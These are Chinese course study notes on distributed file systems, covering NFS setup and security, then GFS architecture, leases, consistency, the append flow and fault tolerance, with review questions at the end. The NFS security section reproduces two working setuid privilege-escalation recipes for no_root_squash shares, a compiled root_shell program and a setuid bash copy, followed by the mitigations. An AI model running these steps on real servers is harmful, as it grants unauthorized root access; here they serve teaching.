## 本章要点

- 分布式文件系统存三类数据：Blob 对象、定长块、大文件，内部统一按 chunk 组织。
- NFS 是虚拟文件系统，建在主服务节点的本地文件系统之上，不自己管磁盘。
- GFS 三种角色：Master、ChunkServer、Client。客户端只缓存元数据，不缓存文件数据。
- 租约把 chunk 的写操作授权下放给主 ChunkServer，目的是减轻 Master 负载。
- GFS 一致性模型三个状态：inconsistent、consistent but undefined、defined。
- 追加流程两个特色：流水线、数据流与控制流分离。

## 4.1 分布式文件系统概述

互联网应用需要存储大量的图片、照片、视频等非结构化数据对象。这类数据以对象的形式组织、对象之间没有关联，一般称为 **Blob**（Binary Large Object，二进制大对象）数据。

分布式文件系统用于存储 Blob 对象，典型系统有 Facebook Haystack 和 Taobao File System（TFS）。另外分布式文件系统也常作为分布式表格系统和分布式数据库的底层存储：

- Google 的 GFS（存储大文件）作为分布式表格系统 Bigtable 的底层存储
- Amazon 的 EBS（Elastic Block Store，弹性块存储）作为分布式数据库 Amazon RDS 的底层存储

总体上看，分布式文件系统存储三种类型的数据：**Blob 对象、定长块、大文件**。

实现层面：内部按照**数据块（chunk）**来组织数据，每个数据块大小大致相同。每个数据块可以包含多个 Blob 对象或定长块，一个大文件也可以拆分为多个数据块。系统把这些数据块分散到存储集群，处理数据复制、一致性、负载均衡、容错等难题，并把用户对 Blob 对象、定长块、大文件的操作映射为对底层数据块的操作。

设计需求四条：

- 支持访问远程服务器上的数据
- 需要考虑并发性
- 可能支持多副本和本地化缓存
- 实现复杂度和应用场景决定了具体系统设计

## 4.2 网络文件系统 NFS

### 简介

NFS 是 Network File System 的简写，即网络文件系统。功能是通过网络让不同的机器、不同的操作系统能够彼此分享数据，让应用程序在客户端通过网络访问位于服务器磁盘中的数据，是在 Unix 系统间实现磁盘文件共享的一种方法。

- 以标准 UNIX 文件系统接口的形式提供服务（POSIX）
- 网络驱动器挂载（mount）到本地操作系统目录中

集群文件系统存储的三类内容：

| 内容 | 存储方式 |
| --- | --- |
| 系统程序 | 每个节点独立安装操作系统、独立运行 |
| 应用程序 | 主节点存储，从节点共享、用户按权限使用 |
| 用户数据 | 主节点存储，从节点共享、用户独立空间 |

共享存储器的三个优点：

- 集群内数据共享，减少本地工作站存储副本数量，使用更少的磁盘空间，通常的数据可以存放在一台机器上通过网络共享访问。
- 用户不必在每台机器上都有一个 home 目录。Home 目录可以放在 NFS 服务器上，便于管理，并且在网络中各节点上都可用。
- 便于实现集群动态伸缩（服务器上下线）。

NFS 的特点：

- NFS 是**虚拟的文件系统**，不实际管理本地磁盘的数据。
- 建立在主服务节点的文件系统之上：本地磁盘驱动器由本地文件系统管理（EXT、ReiserFS 等），其他网络用户远程挂载 NFS 服务。

### 配置和应用

NFS 至少有两个主要部分：一台服务器和一台（或者更多）客户机。客户机远程访问存放在服务器上的数据，采用客户机与服务器工作模式。

典型用法：在 NFS 服务器上把 `/nfs/public` 目录设置为输出目录（共享目录），其他客户端就可以把这个目录挂载到自己系统中的某个目录下，如 `/mnt/nfs`。用户登录到客户机并进入 `/mnt/nfs`，就能看到服务器 `/nfs/public` 下的所有子目录及文件，只要有相应权限就可以使用 `cp`、`cd`、`mv`、`rm`、`df` 等命令操作。

**`exports` 文件配置**

每一行提供一个共享目录的设置，格式为：

```
<输出目录> [客户端1(选项1,选项2,...)] [客户端2(选项1,选项2,...)]
```

课件里的例子（IP 已替换为占位）：

```
/root/share/   192.168.x.x  (rw, sync, all_squash)
/home/share/   .jlu.edu.cn  (ro, sync, all_squash)
/root/share/   192.168.x.x  (rw, insecure, sync, all_squash)
```

客户端的写法：

| 写法 | 含义 |
| --- | --- |
| `192.168.x.x` | 指定 IP 地址的主机 |
| `192.168.x.x/24` | 指定子网中的所有主机 |
| `pc1.vpn.net` | 指定域名的主机 |
| `*.vpn.net` | 指定域中的所有主机 |
| `*` 或缺省 | 所有主机 |

访问权限选项：

| 选项 | 含义 |
| --- | --- |
| `ro` | 设置输出目录只读 |
| `rw` | 设置输出目录可读写 |
| `sync` | 同步写 |
| `async` | 异步写 |

**挂载命令**

```
mount -t nfs <NFS服务器名或IP地址>:<输出目录> <本地挂载目录>
```

把 NFS 服务器上的 `/nfs/public` 挂载到本机 `/mnt/nfs` 的步骤：

```
mkdir /mnt/nfs
mount -t nfs 192.168.x.x:/nfs/public /mnt/nfs
```

### NFS 的特点与协议

网络文件系统特点：

- 集群环境中实现数据的网络共享
- 与操作系统结合，实现网络文件系统界面
- 灵活的权限控制
- 广域网支持（较新的能力）

协议演进：

- 早期版本使用无状态协议，基于 UDP 连接实现，文件锁等功能依赖于上层协议的实现。
- 现代版本使用 TCP/IP。

**NFS 锁**：NFS v4 支持文件锁。

- 客户端向服务端申请锁
- 服务端向客户端响应锁
- **锁是基于租约实现的**，客户端必须在锁过期前不断更新锁租约
- 过期的锁会被服务端丢弃

这里的租约和 06 里讲的租约机制、GFS 的 chunk 租约是同一套思想，可以串起来记。

### 安全性问题

分布式文件系统（DFS）的三类安全性问题：认证、数据传输、特权提升。

课件给了两个**特权提升**的攻击示例，用来说明 `no_root_squash` 配置下 NFS 的危险性。它们利用的是 setuid 位在客户端和服务端之间共享：

方法一，制作 root_shell 漏洞程序（以攻击者本地 root 身份执行）：

```sh
echo 'int main() { setgid(0); setuid(0); system("/bin/bash -p"); return 0; }' > /mnt/share/root_shell.c
gcc ./root_shell.c -o ./root_shell
cp root_shell /mnt/share/
chmod +s /mnt/share/root_shell
```

然后在受害者本地以普通用户执行 `./root_shell`，即可获得 NFS server 的 root 权限。

方法二，复制 `/bin/bash`：

```sh
cp /bin/bash /share                # 受害者本地普通用户
chown root:root /mnt/share/bash    # 攻击者本地 root
chmod +s /mnt/share/bash           # 攻击者本地 root
```

然后执行 `/share/bash -p` 获得受害者的 root 权限。

（更正：原文方法一的 C 代码里用的是中文引号 `“/bin/bash -p"`，这样编译不过，上面改成了英文直引号。）

防护要点就是服务端配置 `root_squash`（把客户端 root 映射成 nobody）和 `nosuid` 挂载选项。

**用户认证和数据隐私**

- 早期 NFS 使用客户端协议，登录请求传送给操作系统处理，有安全风险；现代 NFS 可以依赖其他安全的解决方案。
- 早期 NFS 在网络中传送未加密数据；现代 NFS 可以使用 SSH 协议加密传输。

**单机文件系统与集群（网络）文件系统的对比**：单机的问题是数据重复造成资源浪费、用户权限管理困难，这正是网络文件系统要解决的。

## GFS

（课件把这一节编号写成 4.5，和前面的"4.5 Hadoop 中的调度问题"重号。原文两节都叫 4.5，这里按内容分到两份笔记里。）

### 设计需求

Google 对分布式文件系统的应用需求：

- 使用廉价的不可靠的计算机设备，搭建大规模数据存储
- 高可靠性、高性能（这两条本身是矛盾的）

现有文件系统的缺陷：

- 不支持 Google 的分布式应用程序
- 大规模批处理性能差
- 与 Google 应用的结合不好

**五条假设**（这是理解 GFS 所有设计决策的起点，必须背）：

1. **较高的模块错误率**。在廉价的商用设备上系统出错率较高。
2. **系统总体存储容量大，但是文件数量不多**。百万量级的文件数量（1PB 除以 1GB），文件大小 100MB 或更大，GB 甚至 TB 级别。
3. **文件操作以读为主，支持扩展更新**，并且支持并发操作。
4. **大规模并发连续流式读**（streaming）。
5. **追求高吞吐量，不在意低延迟**。

每条假设都对应一个设计选择：错误率高所以三副本加自动容错；文件少而大所以 chunk 设成 64MB、元数据可以全放内存；以读和追加为主所以不支持随机改写；流式读所以客户端不缓存数据；不在意延迟所以可以用流水线转发。

### 简介

Google 文件系统（GFS）是构建在廉价服务器之上的大型分布式系统。它把服务器故障视为正常现象，通过软件的方式自动容错，在保证系统可靠性和可用性的同时大大降低系统成本。

GFS 是 Google 分布式存储的基石，其他存储系统如 Google Bigtable、Google Megastore、Google Percolator 均直接或间接地构建在 GFS 之上。Google 的大规模批处理系统 MapReduce 也需要利用 GFS 作为海量数据的输入输出。

### 设计要点

- **文件分片 chunks**：固定大小 64MB，chunk 内再分 block，block 大小 64KB。
- **通过副本机制保证可靠性**：默认三个副本，存储于三个服务器节点上。
- **主节点负责管理元数据**（包括命名空间），主从结构。
- **不支持数据缓存**：大数据集流式读取，缓存对性能提升不大。
- **类文件系统接口（非 POSIX）**：主要上层应用是 MapReduce 和 Bigtable。

### 架构

GFS 系统的节点分三种角色：

| 角色 | 职责 |
| --- | --- |
| GFS Master（主控服务器） | 维护元数据：文件及 chunk 命名空间、文件到 chunk 的映射、chunk 位置信息。负责全局控制：chunk 租约管理、垃圾回收无用 chunk、chunk 复制。定期与 CS 通过心跳交换信息 |
| GFS ChunkServer（CS，数据块服务器） | 以普通 Linux 文件的形式把 chunk 存储在磁盘中 |
| GFS 客户端 | 一组专用接口，不遵循 POSIX 规范，以库文件的形式提供 |

GFS 文件被划分为固定大小的数据块（chunk），由主服务器在创建时分配一个 64 位全局唯一的 chunk 句柄。chunk 在不同的机器中复制多份，默认三份。

**客户端的访问流程**：先访问主控服务器节点，获取与之交互的 CS 信息，然后**直接访问这些 CS** 完成数据存取。这条路径是 GFS 减轻 Master 负载的关键：Master 只经手元数据，不经手数据。

**客户端不缓存文件数据，只缓存从主控服务器获取的元数据**，原因有三：

- 对 MapReduce，GFS 客户端使用方式为顺序读写，没有缓存文件数据的必要。
- Bigtable 作为分布式表格系统，内部实现了一套缓存机制。
- 维护客户端缓存与实际数据之间的一致性是一个极其复杂的问题。

### 主从结构的潜在问题与 GFS 的对策

主从结构存在两个问题：单点错误、扩展性问题。GFS 的方案：

- **Shadow masters 作为热备份**，应对单点错误。
- **减小主节点负载**：
  - 主节点只保存元数据，不经手数据。
  - 客户端可以缓存元数据来缓解主节点压力。
  - 增大 data chunk size。用 64MB 的 chunk，$(1\text{PB}/64\text{MB}) \times 3 \times 64\text{B} = 3\text{GB}$，元数据能全装进内存。
  - 数据更新对主节点压力大的问题，通过外放租约权限（chunk lease）解决。
- 整体上追求简单、高效。

### 管理元数据

主节点管理三类全局元数据：

- 文件命名空间
- 文件的 chunk 信息
- chunk 及副本的存储位置信息

元数据信息在内存中存放，每个 chunk 占 64 字节：

- 内存容量不会成为瓶颈：$(1\text{PB}/64\text{MB}) \times 3 \times 64\text{B} = 3\text{GB}$
- 快速查询、方便访问

支持操作日志：

- 先修改操作日志、日志写入外存，然后修改内存
- 日志定义了数据操作的顺序
- 遇到故障，可根据日志恢复内存状态
- 定期制作 checkpoints，将内存状态写入外存，加快恢复过程

这一套和 06 里的 REDO 日志加 checkpoint 完全对应。

### 租约机制（重点）

**问题**：GFS 数据追加以记录为单位，每个记录的大小为几十 KB 到几 MB 不等。如果每次记录追加都需要请求 Master，Master 显然会成为系统的性能瓶颈。

**思路**：减少主节点负担，让它少参与。

**解决方案**：通过租约（lease）机制把 chunk 写操作授权给 ChunkServer。拥有租约授权的 ChunkServer 称为**主 ChunkServer**，其他副本所在的称为**备 ChunkServer**。租约授权针对单个 chunk，在租约有效期内对该 chunk 的写操作都由主 ChunkServer 负责，从而减轻 Master 的负载。租约的有效期比较长，比如 60 秒，只要没有出现异常，主 ChunkServer 可以不断向 Master 请求延长租约的有效期直到整个 chunk 写满。

**租约与版本号的配合**（这道题课件专门举例讲了）

假设 chunk A 在 GFS 中保存了三个副本 A1、A2、A3，其中 A1 是主副本。如果副本 A2 所在的 ChunkServer 下线后又重新上线，并且在 A2 下线的过程中副本 A1 和 A3 有更新，那么 A2 需要被 Master 当成垃圾回收掉。

GFS 通过对每个 chunk 维护一个**版本号**来解决：每次给 chunk 进行租约授权或者主 ChunkServer 重新延长租约有效期时，Master 会把 chunk 的版本号加 1。A2 下线的过程中 A1 和 A3 有更新，说明主 ChunkServer 向 Master 重新申请过租约并增加了版本号。等到 A2 重新上线，Master 发现 A2 的版本号太低，从而把 A2 标记为可删除的 chunk，Master 的垃圾回收任务定时检查并通知 ChunkServer 回收掉 A2。

版本号的两个作用：

- ChunkServer 动态上下线时，用来控制数据一致性状态，版本号越大数据越新。
- 用于定期回收空间、删除过期数据。

### 一致性模型（重点）

两个基本定义：

- **Consistent（一致）** = 所有副本值相同
- **Defined（确定）** = 所有副本写入操作完成，并且一致

三种状态：inconsistent（不一致）、consistent but undefined（一致但不确定）、defined（确定）。

一致性性质：

- 并发写可保证 consistent，但不一定 defined。
- 失败的写操作有可能导致不一致的状态。
- 部分的一致性需要上层应用的支持，由应用层解决数据一致性的问题。

要点归纳：

- 无更新异常，可保证数据一致。
- 更新异常可能导致数据重复、错位：更新在某些副本中被追加了多次；追加不成功导致的填充记录 padding（用于对齐或临时占位）；多客户端更新数据时追加顺序可能不一致。
- 追求并发性能，损失一致性保证。
- 更高的一致性要求需要上层应用支持，比如 MapReduce 和 Bigtable。

**为什么 GFS 为追加而不是改写设计**

两条理由：

1. 改写的需求比较少，或者可以通过追加来实现。比如只使用 GFS 的追加功能就构建出了分布式表格系统 Bigtable。
2. 追加的一致性模型相比改写要更加简单有效。

具体对比：考虑 chunk A 的三个副本 A1、A2、A3。一个**改写**操作修改了 A1、A2 但没有修改 A3，落到副本 A3 的读操作可能读到**不正确**的数据；相应地，一个**追加**操作往 A1、A2 上追加了一个记录但追加 A3 失败，那么即使读操作落到 A3 也只是读到**过期**而不是**错误**的数据。过期数据可以被识别和跳过，错误数据不行。

**追加的一致性保证**（四条，答题时逐条写）

- 如果不发生异常，追加成功的记录在 GFS 的各个副本中是确定并且严格一致的。
- 如果出现异常，可能出现某些副本追加成功而某些副本没有成功的情况，失败的副本可能会出现一些可识别的填充（padding）记录。
- GFS 客户端追加失败将重试。只要返回用户追加成功，说明在所有副本中都至少追加成功了一次。
- 可能出现记录在某些副本中被追加了多次（重复记录），也可能出现一些可识别的填充记录，应用层需要能够处理这些问题。

另外，GFS 支持多个客户端并发追加，多个客户端之间的顺序无法保证。同一个客户端连续追加成功的多个记录也可能被打断：客户端先后追加成功记录 R1 和 R2，由于追加这两条记录的过程不是原子的，中途可能被其他客户端打断，GFS 的 chunk 中记录的 R1 和 R2 可能不连续，中间夹杂着其他客户端追加的数据。

**应用层怎么应付**：对于 MapReduce，由于其批处理特性，可以先把数据追加到一个临时文件，在临时文件中维护索引记录每个追加成功的记录的偏移，等到文件关闭时一次性把临时文件改名为最终文件。对于上层的 Bigtable 有两种处理方式（见 [10 分布式表格系统 Bigtable.md](<10 分布式表格系统 Bigtable.md>)：操作日志用序列号去重，SSTable 只索引最后一条写入成功的记录）。

### Master 的职责清单

- 存储元数据
- 管理命名空间和锁
- 定时与 ChunkServer 通信：发布命令、收集状态、追踪健康状态
- 创建 chunk、修复副本、负载调整：调整负载和访问速度；分散布置副本来减小关联错误；副本失效后修复副本
- 回收垃圾：删除文件后修改元数据、记录删除操作；定期删除元数据并通知 ChunkServer 删除无效 chunk（3 天失效时间）
- 删除过期副本：通过租约机制检测过期副本、清理空间

### 追加流程（重点）

Mutation 在 GFS 语境里指追加（写），必须在所有副本上都起作用。

设计目标是减小 Master 的参与。两个机制：

**租约机制**

- Master 选择一个副本作为主副本，赋予管理该副本的租约
- 主副本定义追加操作序列
- 所有其他副本执行该操作序列

**数据流和控制流分离**

课件给的 Mutation 例子（两个客户端并发追加同一个文件）：

1. Client 1 打开 `foo` 文件进行更新，主副本为 C，其他副本为 A 和 B。
2. Client 1 发送数据 X 给 chunkservers。
3. Client 2 打开 `foo` 文件进行更新，C 仍为主副本。
4. Client 2 发送数据 Y 给 chunkservers。
5. Server C 确定操作序列 X、Y。
6. 其他 chunkservers 收到数据，回复确认。
7. 所有 chunkservers 确认执行操作序列 X、Y。
8. Clients 1 和 2 关闭连接。
9. C 租约到期。

关键点在第 5 步：并发的追加请求由主副本统一排序，所有副本按同一个序列执行，这是"consistent"的来源。但 X 和 Y 谁在前由主副本决定，客户端无法预期，这是"undefined"的来源。

**做法一：主备复制流程**（六步）

1. 客户端向 Master 请求 chunk 每个副本所在的 ChunkServer。
2. Master 返回客户端主副本和备副本所在 ChunkServer 的位置信息。
3. Client 将待追加数据发送到主副本，主副本可能收到多个客户端的并发追加请求，需要确定操作顺序并写入本地。
4. 主副本将数据通过**流水线**的方式转发给所有的备副本。
5. 每个备副本收到待追加的记录数据后写入本地，所有副本都在本地写成功并且收到后一个副本的应答消息时向前一个副本回应。比如备副本 A 需要等待备副本 B 应答成功且本地写成功后才可以应答主副本。
6. 主副本应答客户端。如果客户端在超时时间之内没有收到主副本的应答，说明发生了错误，需要重试。

**做法二：数据流和控制流分离**（七步，GFS 实际采用的）

1. 客户端向 Master 请求 chunk 每个副本所在的 ChunkServer，其中主 ChunkServer 持有修改租约。如果没有 ChunkServer 持有租约，说明该 chunk 最近没有写操作，Master 会发起一个任务，按照一定策略把租约授权给其中一台 ChunkServer。
2. Master 返回客户端主副本和备副本所在的 ChunkServer 位置信息，客户端缓存这些信息供以后使用。如果不出现故障，客户端以后读写该 chunk 都不需要再次请求 Master。
3. 客户端将要追加的记录发送到**每一个副本**，每个 ChunkServer 在内部的 LRU 结构中缓存这些数据。采用数据流和控制流分离的方法，从而能够基于网络拓扑结构更好地调度数据流的传输。
4. 当所有副本都确认收到了数据，客户端发起一个写请求控制命令给主副本。主副本可能收到多个客户端对同一个 chunk 的并发追加操作，主副本确定这些操作的顺序并写入本地。
5. 主副本把写请求提交给所有备副本，每个备副本根据主副本确定的顺序执行写操作。
6. 备副本成功完成后应答主副本。
7. 主副本应答客户端。如果有副本发生错误，将出现主副本写成功但某些备副本不成功的情况，客户端将重试。

**两个特色**

**流水线**用来减少延时。一个 ChunkServer 接收到一些数据就立即开始转发。由于采用全双工网络，立即发送数据并不会降低接收数据的速率。抛开网络阻塞，传输 $B$ 个字节到 $R$ 个副本的理想时间是

$$\frac{B}{T} + RL$$

其中 $T$ 是网络吞吐量，$L$ 是节点之间的延时。课件说采用千兆网络、$L$ 通常小于 1ms 时，传输 1MB 数据到多个副本的时间小于 80ms。

按千兆网复算一下：$T = 1000/8 = 125$ MB/s，$B = 1$ MB，$R = 3$，$L = 1$ ms，得 $1/125 \text{ s} + 3 \times 1 \text{ ms} = 8 + 3 = 11$ ms。80ms 这个数对应的其实是百兆网（$1\text{MB} / 12.5\text{MB/s} = 80$ ms），也就是 GFS 原论文里的网络条件。课件的"小于 80ms"没有说错，但更准确的说法是千兆网下约 11ms。

**分离数据流与控制流**主要是为了优化数据传输，每一台机器都把数据发送给网络拓扑图上"最近"的尚未收到数据的机器。

例子：有三台 ChunkServer S1、S2、S3，S1 与 S3 在同一个机架上，S2 在另外一个机架上，客户端部署在 S1 上。

- 如果数据先从 S1 转发到 S2、再从 S2 转发到 S3，需要经历**两次**跨机架数据传输。
- 按照 GFS 的策略，数据先发送到 S1，接着从 S1 转发到 S3，最后转发到 S2，只需要**一次**跨机架数据传输。

**两种做法对比**

| | 数据流控制流分离 | 主备复制 |
| --- | --- | --- |
| 优点 | 方便进行数据传输优化（利用数据中心网络拓扑、流水线操作）；适合批量修改数据 | 流程简单；管理消息负担小 |
| 缺点 | 流程相对复杂 | 数据必须跟着控制路径走，无法按拓扑优化 |

### 容错机制

**Master 容错**

与传统方法类似，通过操作日志加 checkpoint 的方式，并且有一台称为 Shadow Master 的实时热备。

Master 上保存三种元数据信息：

1. 命名空间（Name Space），即整个文件系统的目录结构以及 chunk 基本信息
2. 文件到 chunk 之间的映射
3. chunk 副本的位置信息，每个 chunk 通常有三个副本

恢复方式：Master 的修改操作总是先记录操作日志、然后修改内存。故障重启时可以通过磁盘中的操作日志恢复内存数据结构。为了减少宕机恢复时间，Master 会定期把内存中的数据以 checkpoint 文件的形式转储到磁盘，减少回放的日志量。

为了进一步提高可靠性和可用性，GFS 还会执行实时热备：所有的元数据修改操作都必须保证发送到实时热备才算成功，远程的实时热备实时接收 Master 发送的操作日志并在内存中回放。如果 Master 宕机，可以秒级切换到实时备机继续提供服务。为了保证同一时刻只有一台 Master，GFS 依赖 Google 内部的 Chubby 服务进行选主操作。

**哪些元数据需要持久化**（考点）：Master 需要持久化前两种元数据（命名空间、文件到 chunk 的映射）；第三种 chunk 副本的位置信息**可以不持久化**，因为 ChunkServer 自己维护了这些信息，即使 Master 故障，也可以在重启时通过 ChunkServer 汇报来获取。

**ChunkServer 容错**

GFS 采用复制多个副本的方式实现 ChunkServer 容错，每个 chunk 有多个存储副本、分别存储在不同的 ChunkServer 上。对于每个 chunk，**必须将所有的副本全部写入成功才视为成功写入**。如果相关的副本出现丢失或不可恢复的情况，Master 自动将副本复制到其他 ChunkServer，确保副本保持一定的个数。

另外，ChunkServer 会对存储的数据维持**校验和**：GFS 以 64MB 为 chunk 大小划分文件，每个 chunk 又以 Block 为单位划分，Block 大小为 64KB，每个 Block 对应一个 32 位的校验和。读取一个 chunk 副本时，ChunkServer 把读取的数据和校验和比较，如果不匹配就返回错误，客户端将选择其他 ChunkServer 上的副本。

**安全性**

课件的说法是"基本没有"：依赖于 Google 数据中心的私有网络。Google 全球有 50 多个 GFS 集群、数千节点规模。

### GFS 小结

- 支持大规模数据存储和处理，仅使用相对廉价的商用硬件。
- 设计目标是能够容忍频繁的错误并保证并发性能。
- 大文件读和追加写（随机写对数据一致性影响较大）。
- 文件接口扩展开发（非 POSIX）。
- 主从结构。

## 典型题

**Q1. GFS 为什么把 chunk 设成 64MB 这么大？**

三个理由串起来答。第一，Master 把全部元数据放在内存里，每个 chunk 占 64 字节，chunk 越大元数据越少：1PB 数据按 64MB 切是 1600 多万个 chunk，三副本乘 64 字节一共才 3GB，内存放得下。第二，GFS 的应用场景是大文件流式读，大 chunk 意味着一次寻址能连续读很多数据，寻址开销被摊薄。第三，大 chunk 让客户端能长时间复用同一份缓存的位置信息和同一个租约，进一步减少对 Master 的请求。代价是小文件会造成热点和空间浪费，所以 GFS 干脆声明不支持小文件。

**Q2. 什么是租约机制？GFS 为什么需要它？**

租约是带超时时间的授权。GFS 把某个 chunk 的写操作授权给一台 ChunkServer（主 ChunkServer），有效期比如 60 秒，期间该 chunk 的所有写都由这台机器定序并驱动，不再经过 Master。没有租约的话，每条几十 KB 的追加记录都要请求一次 Master 来定序，Master 必然成为瓶颈。租约还带版本号：每次授权或续约版本号加 1，下线又上线的副本版本号落后就会被判定为过期并回收。

**Q3. 解释 GFS 一致性模型的三种状态。**

consistent 指所有副本内容相同；defined 指所有副本内容相同**且**能完整反映一次写入的结果；inconsistent 指副本之间内容不同。并发追加的结果是 consistent but undefined：所有副本执行的是主副本定的同一个序列，所以内容一样，但客户端无法预知自己的记录被排在哪、和别人的记录怎么交错。写失败重试则可能留下 inconsistent 区域或重复记录和 padding，需要应用层用校验和加唯一记录 ID 去处理。

**Q4. 为什么 GFS 把数据流和控制流分开？举例说明收益。**

分开之后数据可以沿网络拓扑最优的路径流动，而不必跟着"客户端到主副本到备副本"这条控制路径走。课件的例子：S1、S3 同机架，S2 在另一个机架，客户端在 S1 上。按控制路径走是 S1 到 S2 到 S3，跨机架两次；按拓扑最优走是 S1 到 S3 再到 S2，跨机架只有一次。加上流水线转发（收到一点就转发一点），传 $B$ 字节到 $R$ 个副本的理想时间是 $B/T + RL$。

**Q5. GFS 的 Master 保存哪三类元数据？哪些需要持久化？为什么？**

三类是命名空间、文件到 chunk 的映射、chunk 副本的位置信息。前两类需要持久化（写操作日志加 checkpoint），因为丢了没法重建。第三类不需要持久化，因为每台 ChunkServer 自己清楚它存了哪些 chunk，Master 重启后让所有 ChunkServer 汇报一遍就能重建，而且这份信息本来就在不停变化，持久化反而增加负担。

**Q6. 为什么 GFS 面向追加而不是改写设计？**

因为追加的失败后果更轻。改写时如果三个副本只改成功了两个，落在第三个副本上的读会读到**错误**的数据，应用没办法发现。追加时如果只成功了两个，第三个副本只是**少了**一条记录，读到的是过期而非错误的内容，而且失败留下的 padding 是可识别的。加上 Google 的应用里改写需求本来就少，很多改写可以用"追加新版本"代替，所以 GFS 只把追加做好。
